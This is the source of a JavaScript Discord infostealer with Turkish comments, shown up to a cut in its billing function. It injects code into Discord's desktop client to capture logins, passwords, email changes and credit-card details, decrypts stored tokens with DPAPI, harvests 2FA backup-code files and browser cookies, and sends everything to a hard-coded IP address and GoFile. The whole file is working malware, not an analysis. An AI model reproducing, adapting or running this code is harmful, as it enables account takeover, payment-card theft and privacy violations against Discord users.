

const path = require("path");
const fs = require('fs');
const WebSocket = require('ws');
const crypto = require('crypto');
const sqlite3 = require("sqlite3").verbose();
const FormData = require("form-data");
const AdmZip = require('adm-zip');
const { default: Dpapi } = require('@primno/dpapi');
const { exec, spawn, execSync } = require("child_process");
const os = require('os');
const axios = require("axios");

const URL = "http://93.115.10.217:1337";
const tempDir = os.tmpdir();
const debugLogPath = path.join(tempDir, 'stealer_debug.log');

let config = {
    userid: "ruhi123"
};
let globalUserid = config.userid;

// Discord yolları
const DISCORD_PATHS = [
    path.join(process.env.LOCALAPPDATA, "Discord"),
    path.join(process.env.LOCALAPPDATA, "DiscordCanary"),
    path.join(process.env.LOCALAPPDATA, "DiscordPTB")
];

const appdata = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;

const paths = [
    appdata + '\\discord\\',
    appdata + "\\discordcanary\\",
    appdata + "\\discordptb\\",
    appdata + "\\discorddevelopment\\",
    appdata + "\\lightcord\\"
];

const tokens = [];

// Debug log fonksiyonu
function debugLog(message) {
    try {
        const timestamp = new Date().toISOString();
        const logEntry = '[' + timestamp + '] ' + message + '\n';
        fs.appendFileSync(debugLogPath, logEntry);
        console.log(message);
    } catch (error) { }
}

// Electron injection kodu oluştur
function getElectronInjectionCode(userid, apiUrl) {
    const hostname = apiUrl.replace('https://', '').replace("http://", '').split('/')[0];
    const port = apiUrl.includes("https://") ? 443 : (apiUrl.includes(':') ? apiUrl.split(':')[2]?.split('/')[0] || 80 : 80);

    return `// L33T Discord Injection - CDP Enhanced
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const https = require('https');
const http = require('http');
const os = require('os');
const querystring = require('querystring');
const { BrowserWindow, session } = require(Buffer.from('656c656374726f6e','hex').toString());

const config = {
  userid: "${userid}",
  api_url: "${apiUrl}",
  hostname: "${hostname}",
  port: ${port},
  useHttps: ${apiUrl.includes("https://")},
  filters: {
    urls: [
      '/auth/login',
      '/users/@me',
    ]
  },
  payment_filters: {
    urls: [
      'https://api.stripe.com/v*/tokens',
    ]
  }
};

const computerName = os.hostname();
let lastToken = null;
let mainWindow = null;
let cdpEnabled = false;
let storedEmail = "";
let storedPassword = "";

const execScript = (script) => {
  const win = BrowserWindow.getAllWindows()[0];
  if (!win) return null;
  return win.webContents.executeJavaScript(script, true);
};

const getToken = async () => {
  try {
    return await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!=void 0).exports.default.getToken()");
  } catch {
    return null;
  }
};

const getUserInfo = async (token) => {
  try {
    const response = await execScript(\`
      fetch('https://'+Buffer.from('646973636f7264','hex').toString()+".com/api/v9/users/@me', {
        headers: { 'Authorization': '\${token}' }
      }).then(r => r.json())
    \`);
    return response;
  } catch {
    return null;
  }
};

const getIP = async () => {
  try {
    const response = await execScript(\`
      fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => d.ip)
    \`);
    return response;
  } catch {
    return 'Unknown';
  }
};

const sendToAPI = (endpoint, data) => {
  const payload = JSON.stringify({
    userid: config.userid,
    computer_name: computerName,
    ...data
  });
  
  const options = {
    hostname: config.hostname,
    port: config.port,
    path: endpoint,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };
  
  const protocol = config.useHttps ? https : http;
  const req = protocol.request(options);
  req.on('error', () => {});
  req.write(payload);
  req.end();
};

// CDP (Chrome DevTools Protocol) Integration
const setupCDP = () => {
  try {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return false;
    
    mainWindow.webContents.debugger.attach('1.3');
    cdpEnabled = true;
    
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
      if (method !== 'Network.responseReceived') return;
      if (!config.filters.urls.some(url => params.response.url.endsWith(url))) return;
      if (![200, 202].includes(params.response.status)) return;
      
      try {
        // Get response body (contains NEW TOKEN!)
        const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
          requestId: params.requestId
        });
        const responseData = JSON.parse(responseBody.body);
        
        // Get request data
        const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
          requestId: params.requestId
        });
        const requestData = JSON.parse(requestBody.postData);
        
        const newToken = responseData.token;
        if (!newToken) return;
        
        switch (true) {
          case params.response.url.endsWith('/login'):
            const userInfo = await getUserInfo(newToken);
            const ip = await getIP();
            
            sendToAPI('/electron-login', {
              token: newToken,
              data: {
                ip: ip,
                discord_path: process.resourcesPath,
                user: userInfo,
                password: requestData.password
              }
            });
            lastToken = newToken;
            console.log('[CDP] Login captured with NEW TOKEN');
            break;
          
          case params.response.url.endsWith('/@me'):
            if (!requestData.password) return;
            
            if (requestData.new_password) {
              const userInfo = await getUserInfo(newToken);
              
              sendToAPI('/electron-password-change', {
                old_password: requestData.password,
                new_password: requestData.new_password,
                token: newToken,
                user: userInfo,
                url: 'password_change'
              });
              lastToken = newToken;
              console.log('[CDP] Password change captured with NEW TOKEN');
            }
            
            if (requestData.email && !requestData.new_password) {
              const userInfo = await getUserInfo(newToken);
              const ip = await getIP();
              
              sendToAPI('/electron-email-change', {
                token: newToken,
                data: {
                  ip: ip,
                  discord_path: process.resourcesPath,
                  user: userInfo,
                  new_email: requestData.email,
                  password: requestData.password
                }
              });
              console.log('[CDP] Email change captured');
            }
            break;
        }
      } catch (err) {
        console.error('[CDP] Error:', err);
      }
    });
    
    mainWindow.webContents.debugger.sendCommand('Network.enable');
    console.log('[CDP] Chrome DevTools Protocol enabled');
    return true;
  } catch (err) {
    console.error('[CDP] Failed to attach debugger:', err);
    return false;
  }
};

// Initialize CDP and send first notification
setTimeout(async () => {
  try {
    // Try to enable CDP
    const cdpSuccess = setupCDP();
    if (cdpSuccess) {
      console.log('[Injection] CDP enabled successfully - will capture NEW tokens from responses');
    } else {
      console.log('[Injection] CDP failed - using fallback webRequest method');
    }
    
    // Send init notification
    const token = await getToken();
    if (token) {
      lastToken = token;
      const userInfo = await getUserInfo(token);
      const ip = await getIP();
      
      sendToAPI('/electron-init', {
        token: token,
        data: {
          ip: ip,
          discord_path: process.resourcesPath,
          user: userInfo
        }
      });
      console.log('[Injection] Initialized');
    }
  } catch (err) {
    console.error('[Injection] Init error:', err);
  }
}, 3000);

// Remove CSP headers
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  delete details.responseHeaders['content-security-policy'];
  delete details.responseHeaders['content-security-policy-report-only'];
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Allow-Origin': '*'
    }
  });
});

// Fallback: Credit card capture (only used if CDP fails)
session.defaultSession.webRequest.onCompleted(config.payment_filters, async (details) => {
  if (cdpEnabled) return; // Skip if CDP is working
  if (![200, 202].includes(details.statusCode)) return;
  if (details.method !== 'POST') return;
  if (!details.uploadData || !details.uploadData[0]) return;
  
  try {
    if (details.url.includes('tokens')) {
      const data = Buffer.from(details.uploadData[0].bytes).toString();
      const parsed = querystring.parse(data);
      const token = await getToken();
      
      if (!token) return;
      
      const userInfo = await getUserInfo(token);
      const ip = await getIP();
      
      sendToAPI('/electron-credit-card', {
        token: token,
        data: {
          ip: ip,
          discord_path: process.resourcesPath,
          user: userInfo,
          card_number: parsed['card[number]'],
          card_cvc: parsed['card[cvc]'],
          card_exp_month: parsed['card[exp_month]'],
          card_exp_year: parsed['card[exp_year]']
        }
      });
      console.log('[WebRequest Fallback] Credit card captured');
    }
  } catch (err) {
    console.error('[WebRequest] Error:', err);
  }
});

module.exports = require('./core.asar');`;
}

// Discord core dosyasını bul
function findDiscordCore(discordPath) {
    try {
        const versions = fs.readdirSync(discordPath).filter(dir => dir.startsWith('app-')).sort();
        if (versions.length === 0) return null;

        const latestVersion = versions[versions.length - 1];
        const corePath = path.join(discordPath, latestVersion, "modules", "discord_desktop_core-1", 'discord_desktop_core');

        if (fs.existsSync(corePath)) return path.join(corePath, "index.js");

        const altPath = path.join(discordPath, latestVersion, "modules", "discord_desktop_core");
        if (fs.existsSync(altPath)) return path.join(altPath, "index.js");

        return null;
    } catch (error) {
        return null;
    }
}

// Electron injection
async function electronInject(userid, apiUrl) {
    const results = [];

    for (const discordPath of DISCORD_PATHS) {
        if (!fs.existsSync(discordPath)) continue;

        const coreFile = findDiscordCore(discordPath);
        if (!coreFile || !fs.existsSync(coreFile)) continue;

        try {
            let content = fs.readFileSync(coreFile, "utf8");

            if (content.includes("L33T Electron Injection")) {
                results.push({ path: discordPath, status: "already_injected" });
                continue;
            }

            if (!content.includes("core.asar")) {
                results.push({ path: discordPath, status: "unexpected_format" });
                continue;
            }

            const injectionCode = getElectronInjectionCode(userid, apiUrl);
            fs.writeFileSync(coreFile, injectionCode);
            results.push({ path: discordPath, status: "success" });

        } catch (error) {
            results.push({ path: discordPath, status: "error", error: error.message });
        }
    }

    return results;
}

// GoFile upload
async function uploadToGoFileRobust(filePath) {
    const maxRetries = 5;
    const delays = [2000, 4000, 6000, 8000, 10000];

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            console.log('[GOFILE] Attempt ' + attempt + '/' + maxRetries + "...");
            debugLog("[GOFILE] Upload attempt " + attempt + '/' + maxRetries + " for: " + filePath);

            const formData = new FormData();
            formData.append("file", fs.createReadStream(filePath));

            const uploadUrl = "https://upload.gofile.io/uploadfile";
            const response = await axios.post(uploadUrl, formData, {
                headers: formData.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 180000
            });

            if (response.data.status === 'ok' && response.data.data?.downloadPage) {
                console.log("[GOFILE] ✅ Upload successful!");
                debugLog("[GOFILE] ✅ Success: " + response.data.data.downloadPage);
                return response.data.data.downloadPage;
            }

            console.log("[GOFILE] ❌ Invalid response, retrying...");
            debugLog('[GOFILE] Invalid response: ' + JSON.stringify(response.data));

        } catch (error) {
            console.error("[GOFILE] ❌ Attempt " + attempt + " failed:", error.message);
            debugLog("[GOFILE] Error on attempt " + attempt + ': ' + error.message);

            if (attempt < maxRetries) {
                const delay = delays[attempt - 1];
                console.log("[GOFILE] Waiting " + delay / 1000 + "s before retry...");
                debugLog("[GOFILE] Waiting " + delay + "ms before retry " + (attempt + 1));
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
    }

    console.error("[GOFILE] ❌ All attempts failed");
    debugLog("[GOFILE] ❌ All " + maxRetries + " attempts failed");
    return null;
}

// Backup codes topla
async function collectBackupCodes() {
    try {
        const homeDir = os.homedir();
        const searchPaths = [
            path.join(homeDir, "Desktop"),
            path.join(homeDir, "Documents"),
            path.join(homeDir, "Downloads")
        ];

        const foundFiles = [];
        const keywords = ['backup', "2fa", "mfa", "discord", "codes", 'code', 'auth'];
        const patterns = [
            /backup.*code/i,
            /2fa.*code/i,
            /discord.*backup/i,
            /authentication.*code/i,
            /\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b/g,
            /\b[A-Z0-9]{8}-[A-Z0-9]{8}\b/g
        ];

        for (const searchPath of searchPaths) {
            if (!fs.existsSync(searchPath)) continue;

            try {
                const files = fs.readdirSync(searchPath);
                for (const file of files) {
                    if (!file.toLowerCase().endsWith('.txt')) continue;

                    const filePath = path.join(searchPath, file);
                    try {
                        const stats = fs.statSync(filePath);
                        if (stats.size > 1024 * 1024) continue; // 1MB limit

                        const fileName = file.toLowerCase();
                        const hasKeyword = keywords.some(keyword => fileName.includes(keyword));

                        if (hasKeyword) {
                            foundFiles.push(filePath);
                            continue;
                        }

                        const content = fs.readFileSync(filePath, 'utf8');
                        for (const pattern of patterns) {
                            if (pattern.test(content)) {
                                foundFiles.push(filePath);
                                break;
                            }
                        }
                    } catch (error) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }

        return foundFiles;
    } catch (error) {
        return [];
    }
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Uygulama adını al
function GetAppName(pathStr) {
    if (pathStr.includes("discord")) {
        if (pathStr.includes("discordcanary")) return "Discord Canary";
        if (pathStr.includes("discordptb")) return 'Discord PTB';
        if (pathStr.includes("discorddevelopment")) return 'Discord Development';
        if (pathStr.includes("lightcord")) return "Lightcord";
        return "Discord";
    }
    if (pathStr.includes("Google")) return "Google Chrome";
    if (pathStr.includes("Opera Software\\Opera GX")) return "Opera GX";
    if (pathStr.includes("Opera Software\\Opera")) return 'Opera';
    if (pathStr.includes("Brave")) return "Brave";
    if (pathStr.includes("Microsoft\\Edge")) return 'Microsoft Edge';
    if (pathStr.includes("Yandex")) return "Yandex Browser";
    if (pathStr.includes("Vivaldi")) return 'Vivaldi';
    if (pathStr.includes("CentBrowser")) return "Cent Browser";
    if (pathStr.includes("Kometa")) return 'Kometa';
    if (pathStr.includes("Orbitum")) return 'Orbitum';
    if (pathStr.includes("Sputnik")) return "Sputnik";
    if (pathStr.includes("Torch")) return "Torch";
    if (pathStr.includes('Amigo')) return 'Amigo';
    if (pathStr.includes("Iridium")) return "Iridium";
    return 'Unknown';
}

// Token bul
async function FindToken(searchPath) {
    const originalPath = searchPath;
    searchPath += "Local Storage\\leveldb";

    const foundTokens = [];

    if (!originalPath.includes("discord")) {
        try {
            fs.readdirSync(searchPath).map(file => {
                if (file.endsWith('.log') || file.endsWith(".ldb")) {
                    fs.readFileSync(searchPath + '\\' + file, 'utf8').split(/\r?\n/).forEach(line => {
                        const tokenPatterns = [
                            new RegExp(/mfa\.[\w-]{84}/g),
                            new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                        ];

                        for (const pattern of tokenPatterns) {
                            const matches = line.match(pattern);
                            if (matches && matches.length) {
                                matches.forEach(token => {
                                    if (!tokens.includes(token)) {
                                        tokens.push(token);
                                        foundTokens.push({
                                            token: token,
                                            location: GetAppName(originalPath)
                                        });
                                    }
                                });
                            }
                        }
                    });
                }
            });
        } catch (error) { }
    } else {
        if (!fs.existsSync(originalPath + "\\Local State")) return foundTokens;

        try {
            fs.readdirSync(searchPath).map(file => {
                if (file.endsWith(".log") || file.endsWith('.ldb')) {
                    fs.readFileSync(searchPath + '\\' + file, 'utf8').split(/\r?\n/).forEach(line => {
                        const encryptedPattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g);
                        const encryptedTokens = line.match(encryptedPattern);

                        if (encryptedTokens) {
                            encryptedTokens.forEach(encryptedToken => {
                                const encryptionKey = Buffer.from(
                                    JSON.parse(fs.readFileSync(originalPath + "Local State")).os_crypt.encrypted_key,
                                    "base64"
                                ).subarray(5);

                                const decryptionKey = Dpapi.unprotectData(
                                    Buffer.from(encryptionKey, "utf-8"),
                                    null,
                                    "CurrentUser"
                                );

                                encryptedToken = Buffer.from(
                                    encryptedToken.split('dQw4w9WgXcQ:')[1],
                                    'base64'
                                );

                                const iv = encryptedToken.slice(3, 15);
                                const encrypted = encryptedToken.slice(15, encryptedToken.length - 16);
                                const tag = encryptedToken.slice(encryptedToken.length - 16, encryptedToken.length);

                                const decipher = crypto.createDecipheriv("aes-256-gcm", decryptionKey, iv);
                                decipher.setAuthTag(tag);

                                const decrypted = decipher.update(encrypted, "base64", "utf-8") + decipher.final('utf-8');

                                if (!tokens.includes(decrypted)) {
                                    tokens.push(decrypted);
                                    foundTokens.push({
                                        token: decrypted,
                                        location: GetAppName(originalPath)
                                    });
                                }
                            });
                        }
                    });
                }
            });
        } catch (error) { }
    }

    return foundTokens;
}

// Token topla
async function GetToken() {
    const allTokens = [];
    debugLog("[GetToken] Starting token collection...");

    try {
        for (let searchPath of paths) {
            debugLog("[GetToken] Checking path: " + searchPath);
            const found = await FindToken(searchPath) || [];
            debugLog("[GetToken] Found " + found.length + " tokens in: " + searchPath);
            allTokens.push(...found);
        }

        debugLog('[GetToken] Total tokens found: ' + allTokens.length);

        if (allTokens.length === 0) {
            debugLog('[GetToken] No tokens found');
            debugLog("[GetToken] Uploading cookie ZIP to GoFile...");

            if (global.cookieZipPath && fs.existsSync(global.cookieZipPath) && !global.cookieAlreadySent) {
                const gofileLink = await uploadToGoFileRobust(global.cookieZipPath);

                if (gofileLink) {
                    debugLog('[GetToken] ✅ Cookie uploaded to GoFile: ' + gofileLink);

                    try {
                        await axios.post(URL + "/cookie-link", {
                            userid: String(globalUserid),
                            cookieLink: gofileLink,
                            computer_name: global.cookieZipComputerName || "Unknown",
                            hasToken: false
                        });
                        debugLog("[GetToken] ✅ Cookie link sent to API");
                        global.cookieAlreadySent = true;
                    } catch (error) {
                        debugLog('[GetToken] ❌ Failed to send link to API: ' + error.message);
                    }
                } else {
                    debugLog('[GetToken] ❌ GoFile upload failed after all retries');
                }
            }

            debugLog("[GetToken] Token processing completed (no tokens)");
            return;
        }

        for (let tokenData of allTokens) {
            const token = tokenData.token;
            const location = tokenData.location;

            debugLog("[GetToken] Processing token from: " + location);
            debugLog("[GetToken] Token (first 20 chars): " + token.substring(0, 20) + '...');

            try {
                debugLog("[GetToken] Validating token with Discord API...");

                const userInfo = await axios.get(
                    "https://" + Buffer.from("646973636f7264", "hex").toString() + ".com/api/v9/users/@me",
                    {
                        headers: {
                            "Content-Type": "application/json",
                            authorization: token
                        }
                    }
                ).then(res => res.data).catch(() => null);

                if (!userInfo) {
                    debugLog("[GetToken] ❌ Token validation FAILED - Token is invalid/locked");
                    debugLog('[TOKEN] Invalid token detected: ' + token.substring(0, 20) + "...");
                    debugLog("[TOKEN] Location: " + location);

                    if (global.cookieZipPath && fs.existsSync(global.cookieZipPath) && !global.cookieAlreadySent) {
                        debugLog("[TOKEN] Cookie ZIP exists, uploading to GoFile (invalid token)...");

                        const gofileLink = await uploadToGoFileRobust(global.cookieZipPath);

                        if (gofileLink) {
                            debugLog("[TOKEN] ✅ Cookie uploaded to GoFile: " + gofileLink);

                            try {
                                await axios.post(URL + "/cookie-link", {
                                    userid: String(globalUserid),
                                    cookieLink: gofileLink,
                                    computer_name: global.cookieZipComputerName || "Unknown",
                                    hasToken: false
                                });
                                debugLog("[TOKEN] ✅ Cookie link sent to API (invalid token)");
                                global.cookieAlreadySent = true;
                            } catch (error) {
                                debugLog("[TOKEN] ❌ Failed to send link to API: " + error.message);
                            }
                        } else {
                            debugLog("[TOKEN] ❌ GoFile upload failed after all retries");
                        }
                    }
                    continue;
                }

                debugLog("[GetToken] ✅ Token validation SUCCESS - User: " + userInfo.username);

                globalUserid = config.userid;

                debugLog("[GetToken] Collecting billing info...");
                const billing = await GetBilling(token);

                debugLog("[GetToken] Collecting friends...");
                const friends = await GetFriends(token);

                debugLog("[GetToken] Collecting badges...");
                const badges = await GetBadges(userInfo.id, token);

                debugLog("[GetToken] Collecting phone...");
                const phone = await GetPhone(token);

                let premiumSince = null;
                try {
                    const profileResponse = await axios.get(
                        "https://discord.com/api/v9/users/" + userInfo.id + '/profile',
                        { headers: { authorization: token } }
                    );
                    premiumSince = profileResponse.data.premium_since;
                } catch (error) { }

                debugLog('[GetToken] Building FormData for /send-token...');

                try {
                    const FormData = require("form-data");
                    const sendTokenForm = new FormData();

                    sendTokenForm.append('userid', String(globalUserid));
                    sendTokenForm.append('id', String(userInfo.id));
                    sendTokenForm.append("token", String(token));
                    sendTokenForm.append("badges", String(badges));
                    sendTokenForm.append("billing", String(billing));
                    sendTokenForm.append('email', String(userInfo.email));
                    sendTokenForm.append("phone", String(phone || ''));
                    sendTokenForm.append("mfa_enabled", String(userInfo.mfa_enabled));
                    sendTokenForm.append('username', String(userInfo.username));
                    sendTokenForm.append("avatar", String(userInfo.avatar || ''));
                    sendTokenForm.append("friends", JSON.stringify(friends.users));
                    sendTokenForm.append('total_friends', String(friends.length));
                    sendTokenForm.append("hq_friends", JSON.stringify(friends.hq_friends || []));
                    sendTokenForm.append("total_hq_friends", String(friends.total_hq_friends || 0));
                    sendTokenForm.append("location", String(location));
                    sendTokenForm.append("premium_type", String(userInfo.premium_type || 0));
                    sendTokenForm.append("premium_since", String(premiumSince || ''));
                    sendTokenForm.append("public_flags", String(userInfo.public_flags || 0));
                    sendTokenForm.append("flags", String(userInfo.flags || 0));
                    sendTokenForm.append("premium_guild_since", String(userInfo.premium_guild_since || ''));

                    console.log("[TOKEN] Checking cookie ZIP - Path:", global.cookieZipPath);
                    console.log('[TOKEN] Cookie ZIP exists:', global.cookieZipPath && fs.existsSync(global.cookieZipPath));

                    if (global.cookieZipPath && fs.existsSync(global.cookieZipPath)) {
                        const zipSize = fs.statSync(global.cookieZipPath).size;
                        console.log('[TOKEN] Cookie ZIP size:', zipSize, "bytes");

                        debugLog('[TOKEN] Uploading cookie ZIP to GoFile - Size: ' + zipSize + " bytes");
                        console.log("[TOKEN] Starting GoFile upload...");

                        const gofileLink = await uploadToGoFileRobust(global.cookieZipPath);

                        if (gofileLink) {
                            console.log("[TOKEN] ✅ Cookie uploaded to GoFile:", gofileLink);
                            debugLog('[TOKEN] ✅ Cookie uploaded to GoFile: ' + gofileLink);
                            sendTokenForm.append("cookieLink", gofileLink);
                            console.log("[TOKEN] cookieLink added to form");
                        } else {
                            console.error("[TOKEN] ❌ GoFile upload failed, continuing without cookie");
                            debugLog("[TOKEN] ❌ GoFile upload failed, continuing without cookie");
                        }
                    } else {
                        console.log("[TOKEN] No cookie ZIP to upload (path:", global.cookieZipPath, ')');
                        debugLog("[TOKEN] No cookie ZIP to upload (path: " + global.cookieZipPath + ')');
                    }

                    debugLog('[TOKEN] Sending POST request to ' + URL + "/send-token...");

                    await axios.post(URL + "/send-token", sendTokenForm, {
                        headers: {
                            ...sendTokenForm.getHeaders(),
                            'ngrok-skip-browser-warning': "true",
                            'User-Agent': 'Mozilla/5.0'
                        },
                        maxContentLength: Infinity,
                        maxBodyLength: Infinity,
                        timeout: 30000
                    });

                    debugLog("[TOKEN] ✅ Retry successful after second attempt!");

                } catch (retryError) {
                    debugLog("[TOKEN] ❌ Retry failed: " + retryError.message);
                    debugLog("[TOKEN] Retry Error Stack: " + retryError.stack);
                    debugLog("[TOKEN] ============== CRITICAL FAILURE ==============");
                    debugLog('[TOKEN] FAILED TO SEND AFTER RETRY');
                    debugLog("[TOKEN] Token: " + token.substring(0, 30) + "...");
                    debugLog("[TOKEN] User: " + userInfo.username);
                    debugLog("[TOKEN] Email: " + userInfo.email);
                    debugLog("[TOKEN] Location: " + location);
                    debugLog("[TOKEN] ===========================================");
                }
            } catch (outerError) {
                debugLog("[GetToken] ❌ Outer catch error: " + outerError.message);
            }
        }

        debugLog("[GetToken] Token processing loop completed");

    } catch (fatalError) {
        debugLog("[GetToken] ❌ Fatal error in GetToken: " + fatalError.message);
        debugLog('[GetToken] Stack: ' + fatalError.stack);
    }
}


// Telefon numarası al
async function GetPhone(token) {
    try {
        const response = await axios.get(
            'https://' + Buffer.from('646973636f7264', "hex").toString() + ".com/api/v9/users/@me",
            {
                headers: {
                    'Content-Type': "application/json",
                    authorization: token
                }
            }
        );
        return response.data.phone || null;
    } catch (error) {
        return null;
    }
}

// Badge tanımları
const badges = {
    staff: { emoji: "<:discordstaff:1451151319694835863>", id: 1 << 0, rare: true },
    early_supporter: { emoji: "<:earlysupporter:1451151332684595293>", id: 1 << 9, rare: true },
    verified_developer: { emoji: "<:botdev:1451151282487169066>", id: 1 << 17, rare: true },
    certified_moderator: { emoji: "<:moderator:1451151425114738773>", id: 1 << 18, rare: true },
    bug_hunter_level_1: { emoji: "<:bughunter1:1451151293224849418>", id: 1 << 3, rare: true },
    bug_hunter_level_2: { emoji: "<:bughunter2:1451151304100544635>", id: 1 << 14, rare: true },
    partner: { emoji: "<:partnered:1451151482115194960>", id: 1 << 1, rare: true },
    hypesquad_house_1: { emoji: "<:hypesquadbalan ce:1451151382789881909>", id: 1 << 6, rare: false },
    hypesquad_house_2: { emoji: "<:hypesquadbravery:1451151394324353096>", id: 1 << 7, rare: false },
    hypesquad_house_3: { emoji: "<:hypeqsquadbrilliance:1451151347402543104>", id: 1 << 8, rare: false },
    hypesquad: { emoji: "<:hypesquad:1451151369649262663>", id: 1 << 2, rare: true },
    nitro: { emoji: '<:duznitro:1451151444534366332>', rare: true },
    nitro_bronze: { emoji: "<:bronzenitro:1451150891859181608>", rare: true },
    nitro_silver: { emoji: "<:silvernitro:1451150928383054024>", rare: true },
    nitro_gold: { emoji: '<:goldnitro:1451150987569008765>', rare: true },
    nitro_platinum: { emoji: "<:platnitro:1451150997643853835>", rare: true },
    nitro_diamond: { emoji: '<:diamondnitro:1451150963753746485>', rare: true },
    nitro_emerald: { emoji: "<:emeraldnitro:1451150977527709696>", rare: true },
    nitro_ruby: { emoji: '<:rubynitro:1451151009177931887>', rare: true },
    nitro_opal: { emoji: "<:opalnitro:1451151021115182335>", rare: true },
    guild_booster_lvl1: { emoji: "<:1ay:1451151142695337984>", rare: true },
    guild_booster_lvl2: { emoji: "<:2ay:1451151154279874561>", rare: true },
    guild_booster_lvl3: { emoji: '<:3ay:1451151164975616064>', rare: true },
    guild_booster_lvl4: { emoji: "<:6ay:1451151175855378616>", rare: true },
    guild_booster_lvl5: { emoji: "<:9ay:1451151186102194256>", rare: true },
    guild_booster_lvl6: { emoji: "<:12ay:1451151197179478017>", rare: true },
    guild_booster_lvl7: { emoji: "<:15ay:1451151207652659303>", rare: true },
    guild_booster_lvl8: { emoji: "<:18ay:1451151242037297222>", rare: true },
    guild_booster_lvl9: { emoji: "<:24ay:1451151259129086046>", rare: true },
    quest_completed: { emoji: "<:questbadge:1451151495711795829>", rare: false, id: 1 << 23 },
    legacy_username: { emoji: "<:oldname:1451151456643055675>", rare: false, id: 1 << 37 },
    orbs: { emoji: "<:orbs:1451151469121110108>", rare: false, id: 1 << 50 }
};

// IP al
const GetIp = async () => (await axios.get('https://www.myexternalip.com/raw').catch(() => null))?.data || 'None';

// Nadir badge'leri al
const GetRareBadges = (flags) =>
    typeof flags !== "number" ? '' :
        Object.values(badges)
            .filter(badge => badge.rare && (flags & badge.id) === badge.id)
            .map(badge => badge.emoji)
            .join('');

// Mevcut Nitro durumu
const CurrentNitro = async (premiumSince) => {
    const result = { badge: null, current: null };
    if (!premiumSince) return result;

    const months = (() => {
        const now = new Date();
        const start = new Date(premiumSince);
        const yearsDiff = now.getFullYear() - start.getFullYear();
        const monthsDiff = now.getMonth() - start.getMonth();
        let totalMonths = yearsDiff * 12 + monthsDiff;
        if (now.getDate() < start.getDate()) totalMonths--;
        if (totalMonths < 0) totalMonths = 0;
        return totalMonths;
    })();

    const tiers = [
        { badge: "nitro_opal", lowerLimit: 72 },
        { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
        { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
        { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
        { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
        { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
        { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
        { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
        { badge: "nitro", lowerLimit: 0, upperLimit: 0 }
    ];

    const tier = tiers.find(t => months >= t.lowerLimit && (t.upperLimit === undefined || months <= t.upperLimit));

    return {
        badge: tier?.badge || null,
        current: premiumSince
    };
};

// Badge'leri al
const GetBadges = async (userId, token) => {
    let profileData = null;
    let userData = null;

    try {
        const response = await axios.get(
            'https://discord.com/api/v9/users/' + userId + '/profile',
            {
                headers: {
                    "Content-Type": "application/json",
                    authorization: token
                }
            }
        );
        profileData = response.data;
        userData = profileData.user || {};
    } catch (error) {
        return "`No Badges`";
    }

    if (!profileData) return "`No Badges`";

    const badgeList = [];
    const publicFlags = userData.public_flags || 0;

    // Nitro badge
    if (profileData.premium_since) {
        const premiumDate = new Date(profileData.premium_since);
        const now = new Date();
        const days = Math.floor((now - premiumDate) / (1000 * 60 * 60 * 24));
        const months = Math.floor(days / 30);

        let nitroBadge = "nitro";
        if (months >= 72) nitroBadge = "nitro_opal";
        else if (months >= 60) nitroBadge = "nitro_ruby";
        else if (months >= 36) nitroBadge = "nitro_emerald";
        else if (months >= 24) nitroBadge = "nitro_diamond";
        else if (months >= 12) nitroBadge = "nitro_platinum";
        else if (months >= 6) nitroBadge = "nitro_gold";
        else if (months >= 3) nitroBadge = "nitro_silver";
        else if (months >= 1) nitroBadge = "nitro_bronze";

        if (badges[nitroBadge]) badgeList.push(badges[nitroBadge].emoji);
    }

    // Public flag badges
    const flagBadges = [
        'staff', "partner", "certified_moderator", "early_supporter",
        "verified_developer", "bug_hunter_level_1", "bug_hunter_level_2", 'hypesquad'
    ];

    for (const badgeName of flagBadges) {
        const badge = badges[badgeName];
        if (badge && badge.id && (publicFlags & badge.id) === badge.id) {
            badgeList.push(badge.emoji);
        }
    }

    // Server boost badge
    if (profileData.premium_guild_since) {
        const boostDate = new Date(profileData.premium_guild_since);
        const now = new Date();
        const days = Math.floor((now - boostDate) / (1000 * 60 * 60 * 24));
        const months = Math.floor(days / 30);

        let boostBadge = "guild_booster_lvl1";
        if (months >= 24) boostBadge = "guild_booster_lvl9";
        else if (months >= 18) boostBadge = "guild_booster_lvl8";
        else if (months >= 15) boostBadge = "guild_booster_lvl7";
        else if (months >= 12) boostBadge = "guild_booster_lvl6";
        else if (months >= 9) boostBadge = "guild_booster_lvl5";
        else if (months >= 6) boostBadge = "guild_booster_lvl4";
        else if (months >= 3) boostBadge = "guild_booster_lvl3";
        else if (months >= 2) boostBadge = "guild_booster_lvl2";

        if (badges[boostBadge]) badgeList.push(badges[boostBadge].emoji);
    }

    return badgeList.length > 0 ? badgeList.join('') : "`No Badges`";
};

// Billing bilgilerini al
const GetBilling = async (token) => {
    const response = await axios.get(
        "https://discord.com/api/v9/users/@me/billing/payment-sources",
        {
            headers: {
